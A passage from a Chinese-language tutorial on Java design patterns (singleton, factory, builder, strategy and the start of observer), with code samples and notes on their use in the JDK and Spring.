<p>这是单例模式的标准写法，既保证了线程安全，又避免了性能损失。</p>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>private static volatile Singleton instance;</code></li>
<li><code>volatile</code>关键字确保了 <code>instance</code>变量的可见性。当一个线程修改了 <code>instance</code>的值，其他线程可以立即看到最新的值。</li>
<li>同时，<code>volatile</code>还能防止指令重排序。在创建 <code>Singleton</code>实例时，<code>new Singleton()</code>操作并非原子操作。它包含三个步骤：分配内存空间、初始化对象、将对象引用赋值给 <code>instance</code>。如果没有 <code>volatile</code>，可能会发生指令重排序，导致其他线程获取到一个尚未完全初始化的 <code>instance</code>对象。</li>
<li><code>private Singleton()</code></li>
<li>私有构造函数确保无法从外部直接实例化 <code>Singleton</code>类，保证了单例模式的唯一性。</li>
<li><code>public static Singleton getInstance()</code></li>
<li>首先检查 <code>instance</code>是否为 <code>null</code>。如果不为 <code>null</code>，直接返回实例，避免进入同步代码块，提高了性能。</li>
<li>如果 <code>instance</code>为 <code>null</code>，进入同步代码块。<code>synchronized (Singleton.class)</code>语句锁定 <code>Singleton</code>类，确保同一时间只有一个线程能进入创建实例的代码块。</li>
<li>再次检查 <code>instance</code>是否为 <code>null</code>。这是为了防止多个线程同时通过第一次检查，进入同步代码块并重复创建实例。</li>
<li>当 <code>instance</code>为 <code>null</code>时，执行 <code>instance = new Singleton();</code>创建单例实例。</li>
</ul>
<h3 data-id="heading-2">代码实现 2：枚举单例模式</h3>
<p>这是 Effective Java 中更推荐的单例模式实现方式。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-built_in">enum</span> SingletonEnum {
    INSTANCE;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doSomething</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"This is a singleton instance doing something."</span>);
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li>枚举类型是 Java 中一种特殊的类。它保证了实例的唯一性，并且天生是线程安全的。</li>
<li><code>INSTANCE</code>是 <code>SingletonEnum</code>枚举的唯一实例。你可以通过 <code>SingletonEnum.INSTANCE</code>获取该单例。</li>
<li>你可以在枚举中添加自定义方法，如 <code>doSomething()</code>，来实现单例需要完成的业务逻辑。</li>
<li>枚举单例可以防止反射和序列化破坏单例，因为 Java 规范保证了枚举类型的实例化是唯一的，且在序列化和反序列化过程中不会创建新实例。</li>
</ul>
<h3 data-id="heading-3">JDK 中的应用：</h3>
<ul>
<li><code>java.lang.Runtime.getRuntime()</code></li>
<li><code>java.util.logging.Logger</code></li>
</ul>
<h3 data-id="heading-4">Spring 中的应用</h3>
<p>默认情况下，Spring 的 <code>Bean</code>是单例模式。你可以通过使用 <code>@Scope("prototype")</code>将其更改为原型模式。</p>
<h2 data-id="heading-5">2. 工厂模式</h2>
<p>工厂模式用于封装对象的创建逻辑，特别是在类实例化过程复杂时，可以降低耦合度**。</p>
<h3 data-id="heading-6">代码实现：简单工厂</h3>
<p>以支付系统为例，不同的支付方式需要不同的对象。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 抽象产品：交通工具 (Vehicle)</span>
abstractclass Vehicle {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span>;
}

<span class="hljs-keyword">class</span> <span class="hljs-title">Car</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Driving a car."</span>);
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title">Bicycle</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Riding a bicycle."</span>);
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title">Truck</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Driving a truck."</span>);
    }
}

<span class="hljs-comment">// 工厂类：交通工具工厂 (Vehicle factories)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title">VehicleFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Vehicle <span class="hljs-title">createVehicle</span>(<span class="hljs-params">String vehicleType</span>)</span> {
        <span class="hljs-keyword">switch</span> (vehicleType) {
            <span class="hljs-keyword">case</span><span class="hljs-string">"car"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Car</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"bicycle"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Bicycle</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"truck"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Truck</span>()</span>;
            <span class="hljs-literal">default</span>:
                <span class="hljs-function">thrownew <span class="hljs-title">IllegalArgumentException</span>(<span class="hljs-params"><span class="hljs-string">"Invalid vehicle type: "</span> + vehicleType</span>)</span>;
        }
    }
}

<span class="hljs-comment">// 测试类</span>
publicclass FactoryPatternExample {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        <span class="hljs-comment">// 创建一辆汽车并驾驶</span>
        Vehicle car = VehicleFactory.createVehicle(<span class="hljs-string">"car"</span>);
        car.drive();

        <span class="hljs-comment">// 创建一辆自行车并骑行</span>
        Vehicle bicycle = VehicleFactory.createVehicle(<span class="hljs-string">"bicycle"</span>);
        bicycle.drive();

        <span class="hljs-comment">// 创建一辆卡车并驾驶</span>
        Vehicle truck = VehicleFactory.createVehicle(<span class="hljs-string">"truck"</span>);
        truck.drive();
    }
}
</code></pre>
<h3 data-id="heading-7">代码解释：</h3>
<ul>
<li>当你需要制造交通工具时，不需要直接调用 <code>Car</code>、<code>Bicycle</code>或 <code>Truck</code>的构造函数，而是调用 <code>VehicleFactory.createVehicle()</code>方法，并传入你想要制造的交通工具类型。</li>
<li>工厂会根据你提供的类型创建并返回相应的交通工具实例。</li>
<li>你可以通过调用 <code>drive()</code>方法来使用制造出来的交通工具。</li>
</ul>
<h3 data-id="heading-8">优点：</h3>
<ul>
<li>代码解耦：交通工具的创建逻辑和使用逻辑分离。用户不需要关心具体的交通工具创建过程，只需要告诉工厂想要什么类型的交通工具。</li>
<li>易于扩展：如果你想添加新的交通工具类型，只需创建一个新的具体交通工具类并继承 <code>Vehicle</code>，然后在 <code>VehicleFactory</code>的 <code>createVehicle()</code>方法中添加相应的创建逻辑即可。</li>
</ul>
<p>例如，如果你想添加 <code>Motorcycle</code>（摩托车）类型，可以这样做：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">class</span> <span class="hljs-title">Motorcycle</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Riding a motorcycle."</span>);
    }
}
</code></pre>
<p>然后在 <code>VehicleFactory</code>中添加相应的逻辑：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">class</span> <span class="hljs-title">VehicleFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Vehicle <span class="hljs-title">createVehicle</span>(<span class="hljs-params">String vehicleType</span>)</span> {
        <span class="hljs-keyword">switch</span> (vehicleType) {
            <span class="hljs-keyword">case</span><span class="hljs-string">"car"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Car</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"bicycle"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Bicycle</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"truck"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Truck</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"motorcycle"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Motorcycle</span>()</span>; <span class="hljs-comment">// 添加摩托车创建逻辑</span>
            <span class="hljs-literal">default</span>:
                <span class="hljs-function">thrownew <span class="hljs-title">IllegalArgumentException</span>(<span class="hljs-params"><span class="hljs-string">"Invalid vehicle type: "</span> + vehicleType</span>)</span>;
        }
    }
}
</code></pre>
<p>这个例子展示了工厂模式如何通过工厂类将对象的创建和使用分离，使得代码更具可扩展性和可维护性，同时也方便了新产品类型的添加。</p>
<p><strong>如果你想进一步避免在工厂类中使用</strong> <strong><code>switch</code></strong> <strong>或</strong> <strong><code>if-else</code></strong> <strong>语句，可以使用反射机制如下：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VehicleFactory</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">Vehicle</span> <span class="hljs-title function_">createVehicle</span>(<span class="hljs-params">Class&lt;? <span class="hljs-keyword">extends</span> Vehicle&gt; vehicleClass</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Constructor</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Vehicle</span>&gt; constructor = vehicleClass.<span class="hljs-title function_">getDeclaredConstructor</span>();
            <span class="hljs-keyword">return</span> constructor.<span class="hljs-title function_">newInstance</span>();
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">NoSuchMethodException</span> | <span class="hljs-title class_">InstantiationException</span> | <span class="hljs-title class_">IllegalAccessException</span> | <span class="hljs-title class_">InvocationTargetException</span> e) {
            thrownew <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to create vehicle: "</span> + e.<span class="hljs-title function_">getMessage</span>());
        }
    }
}

<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">FactoryPatternExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">// 创建一辆汽车并驾驶</span>
        <span class="hljs-title class_">Vehicle</span> car = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-title class_">Car</span>.<span class="hljs-property">class</span>);
        car.<span class="hljs-title function_">drive</span>();

        <span class="hljs-comment">// 创建一辆自行车并骑行</span>
        <span class="hljs-title class_">Vehicle</span> bicycle = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-title class_">Bicycle</span>.<span class="hljs-property">class</span>);
        bicycle.<span class="hljs-title function_">drive</span>();

        <span class="hljs-comment">// 创建一辆卡车并驾驶</span>
        <span class="hljs-title class_">Vehicle</span> truck = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-title class_">Truck</span>.<span class="hljs-property">class</span>);
        truck.<span class="hljs-title function_">drive</span>();
    }
}
</code></pre>
<p>这种方法利用反射避免了繁琐的条件判断，提高了工厂的可扩展性。当添加新的交通工具类型时，无需修改工厂类代码。你只需要将新交通工具类的 <code>Class</code>对象传递给工厂类的 <code>createVehicle()</code>方法即可。</p>
<h3 data-id="heading-9">JDK 中的应用：</h3>
<ul>
<li><code>java.util.Calendar.getInstance()</code></li>
<li><code>javax.xml.parsers.DocumentBuilderFactory.newInstance()</code></li>
</ul>
<h3 data-id="heading-10">Spring 中的应用：</h3>
<ul>
<li><code>BeanFactory</code>和 <code>ApplicationContext</code>都是工厂模式的体现。</li>
</ul>
<h2 data-id="heading-11">3. 建造者模式</h2>
<p>建造者模式用于创建复杂对象，特别是当对象拥有多个可选参数时。</p>
<p>代码实现：组装一台电脑</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 产品类：电脑 (Computer)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Computer</span> {
    <span class="hljs-keyword">private</span> String cpu;
    <span class="hljs-keyword">private</span> String memory;
    <span class="hljs-keyword">private</span> String storage;
    <span class="hljs-keyword">private</span> String graphicsCard;
    <span class="hljs-keyword">private</span> String operatingSystem;

    <span class="hljs-comment">// 私有构造函数，只能通过 Builder 创建对象</span>
    <span class="hljs-keyword">private</span> Computer(Builder builder) {
        <span class="hljs-keyword">this</span>.cpu = builder.cpu;
        <span class="hljs-keyword">this</span>.memory = builder.memory;
        <span class="hljs-keyword">this</span>.storage = builder.storage;
        <span class="hljs-keyword">this</span>.graphicsCard = builder.graphicsCard;
        <span class="hljs-keyword">this</span>.operatingSystem = builder.operatingSystem;
    }

     <span class="hljs-comment">// 静态内部类 Builder</span>
    publicstatic<span class="hljs-keyword">class</span> <span class="hljs-title class_">Builder</span> {
        <span class="hljs-keyword">private</span> String cpu;
        <span class="hljs-keyword">private</span> String memory;
        <span class="hljs-keyword">private</span> String storage;
        <span class="hljs-keyword">private</span> String graphicsCard;
        <span class="hljs-keyword">private</span> String operatingSystem;

        <span class="hljs-comment">// 必填参数通过构造函数传递</span>
        <span class="hljs-keyword">public</span> Builder(String cpu, String memory) {
            <span class="hljs-keyword">this</span>.cpu = cpu;
            <span class="hljs-keyword">this</span>.memory = memory;
        }

        <span class="hljs-comment">// 设置可选参数的方法</span>
        <span class="hljs-keyword">public</span> Builder storage(String storage) {
            <span class="hljs-keyword">this</span>.storage = storage;
            returnthis;
        }

        <span class="hljs-keyword">public</span> Builder graphicsCard(String graphicsCard) {
            <span class="hljs-keyword">this</span>.graphicsCard = graphicsCard;
            returnthis;
        }

        <span class="hljs-keyword">public</span> Builder operatingSystem(String operatingSystem) {
            <span class="hljs-keyword">this</span>.operatingSystem = operatingSystem;
            returnthis;
        }

        <span class="hljs-comment">// 构建最终的 Computer 对象</span>
        <span class="hljs-keyword">public</span> Computer build() {
            returnnew Computer(<span class="hljs-keyword">this</span>);
        }
    }

    <span class="hljs-comment">// 显示电脑配置信息</span>
    <span class="hljs-keyword">public</span> void showConfiguration() {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"CPU: "</span> + cpu);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Memory: "</span> + memory);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Storage: "</span> + storage);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Graphics Card: "</span> + graphicsCard);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Operating System: "</span> + operatingSystem);
    }
}

<span class="hljs-comment">// 测试类</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">BuilderPatternExample</span> {
    <span class="hljs-keyword">public</span> static void main(String[] args) {
        <span class="hljs-comment">// 使用建造者模式构建电脑</span>
        Computer computer = new Computer.Builder(<span class="hljs-string">"Intel i7"</span>, <span class="hljs-string">"16GB"</span>)
               .storage(<span class="hljs-string">"1TB SSD"</span>)
               .graphicsCard(<span class="hljs-string">"NVIDIA RTX 4060"</span>)
               .operatingSystem(<span class="hljs-string">"Windows 10"</span>)
               .build();

        <span class="hljs-comment">// 显示电脑配置信息</span>
        computer.showConfiguration();
    }
}
</code></pre>
<h3 data-id="heading-12"><strong>JDK 中的应用：</strong></h3>
<ul>
<li><code>StringBuilder</code></li>
<li><code>Stream.Builder</code></li>
</ul>
<h3 data-id="heading-13"><strong>Spring 中的应用：</strong></h3>
<ul>
<li><code>BeanDefinitionBuilder</code>用于构建 <code>BeanDefinition</code>对象，这是 Spring 容器管理 Bean 的核心组件。</li>
<li><code>UriComponentsBuilder</code>用于构建 URI。</li>
</ul>
<h2 data-id="heading-14">4. 策略模式</h2>
<p>策略模式将不同的算法封装成独立的类，并允许在运行时选择不同的策略。</p>
<h3 data-id="heading-15">代码实现：出行方式的选择</h3>
<p>这次我们以出行方式的选择为例。不同的出行方式有不同的成本和速度，根据用户需求可以选择不同的出行策略：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 策略接口：出行策略 (Travel Strategy)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>();
    double <span class="hljs-title function_">calculateCost</span>(double distance);
    double <span class="hljs-title function_">calculateTime</span>(double distance);
}

<span class="hljs-comment">// 具体策略：步行 (Walk)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WalkStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel on foot."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 步行通常没有成本</span>
        return0<span class="hljs-number">.0</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设步行速度为每小时 5 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">5.0</span>; 
    }
}

<span class="hljs-comment">// 具体策略：自行车 (Bike)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BikeStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 选择骑自行车出行</span>
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel by bike."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 自行车通常没有成本</span>
        return0<span class="hljs-number">.0</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设自行车速度为每小时 15 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">15.0</span>; 
    }
}

<span class="hljs-comment">// 具体策略：汽车 (Car)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CarStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel by car."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设汽车每公里成本为 0.5 美元</span>
        <span class="hljs-keyword">return</span> distance * <span class="hljs-number">0.5</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设汽车速度为每小时 60 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">60.0</span>; 
    }
}

<span class="hljs-comment">// 具体策略：飞机 (Airplane)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AirplaneStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel by airplane."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设飞机每公里成本为 0.8 美元</span>
        <span class="hljs-keyword">return</span> distance * <span class="hljs-number">0.8</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设飞机速度为每小时 800 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">800.0</span>; 
    }
}

<span class="hljs-comment">// 上下文类：旅行规划者 (Travel Planner)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TravelPlanner</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">TravelStrategy</span> travelStrategy;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-title class_">TravelStrategy</span> travelStrategy) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">travelStrategy</span> = travelStrategy;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setTravelStrategy</span>(<span class="hljs-params">TravelStrategy travelStrategy</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">travelStrategy</span> = travelStrategy;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">planTravel</span>(<span class="hljs-params"/>) {
        travelStrategy.<span class="hljs-title function_">travel</span>();
    }

    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-keyword">return</span> travelStrategy.<span class="hljs-title function_">calculateCost</span>(distance);
    }

    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-keyword">return</span> travelStrategy.<span class="hljs-title function_">calculateTime</span>(distance);
    }
}

<span class="hljs-comment">// 测试类</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">StrategyPatternExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        double distance = <span class="hljs-number">100.0</span>; <span class="hljs-comment">// 假设旅行距离为 100 公里</span>

        <span class="hljs-comment">// 步行出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WalkStrategy</span>());
        travelPlanner1.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner1.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner1.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);

        <span class="hljs-comment">// 骑自行车出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BikeStrategy</span>());
        travelPlanner2.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner2.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner2.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);

        <span class="hljs-comment">// 开车出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CarStrategy</span>());
        travelPlanner3.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner3.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner3.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);

        <span class="hljs-comment">// 乘飞机出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AirplaneStrategy</span>());
        travelPlanner4.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner4.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner4.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);
    }
}
</code></pre>
<h3 data-id="heading-16">代码解释：</h3>
<ul>
<li>首先，通过实现 <code>TravelStrategy</code>接口定义了不同的出行策略。</li>
<li>然后，创建 <code>TravelPlanner</code>对象，并根据需要选择不同的出行策略。</li>
<li>最后，调用 <code>planTravel()</code>方法执行出行操作，并使用 <code>calculateCost()</code>和 <code>calculateTime()</code>方法计算成本和时间。</li>
</ul>
<h3 data-id="heading-17">优点：</h3>
<ul>
<li>易于扩展：如果你想添加新的出行方式，只需创建一个新的 <code>TravelStrategy</code>实现类，无需修改 <code>TravelPlanner</code>类的代码。</li>
<li>灵活切换：你可以轻松地在不同出行策略之间切换，以满足不同的出行需求。</li>
<li>代码清晰：不同出行方式的逻辑被封装在各自的策略类中，使得代码更具可读性和可维护性。</li>
</ul>
<p>这个例子可以帮助你更好地理解策略模式在实际场景中的应用。通过不同的策略实现不同的行为，并能根据用户需求灵活选择和切换策略，同时保持了代码的可扩展性和可维护性。</p>
<p>此外，策略模式通常与工厂模式结合使用，可以将策略对象的创建和使用分离，使代码更加灵活和易于维护。</p>
<h3 data-id="heading-18">JDK 中的应用：</h3>
<ul>
<li><code>java.util.Comparator</code>是一个典型的策略模式。</li>
</ul>
<h3 data-id="heading-19">Spring 中的应用：</h3>
<ul>
<li>事务管理 (<code>TransactionManager</code>)，支持编程式和声明式事务。</li>
</ul>
<h2 data-id="heading-20">5. 观察者模式</h2>
<p>观察者模式定义了一种一对多的依赖关系。当一个对象的状态发生变化时，所有依赖于它的对象都会收到通知。</p>
<h3 data-id="heading-21">代码实现：股价更新系统</h3>
<p>模拟当股价更新时通知投资者。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">// 观察者接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockObserver</span> {
    <span class="hljs-comment">// 当股价更新时，此方法将被主题调用</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span>; 
}

<span class="hljs-comment">// 具体观察者：投资者 (Investor)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Investor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">StockObserver</span> {
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Investor</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-comment">// 打印投资者的名字和接收到的股价更新信息</span>
        System.out.println(name + <span class="hljs-string">" received an update: The current stock price is "</span> + price); 
    }
}

<span class="hljs-comment">// 主题接口 (Subject interface)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockSubject</span> {
    <span class="hljs-comment">// 注册观察者</span>
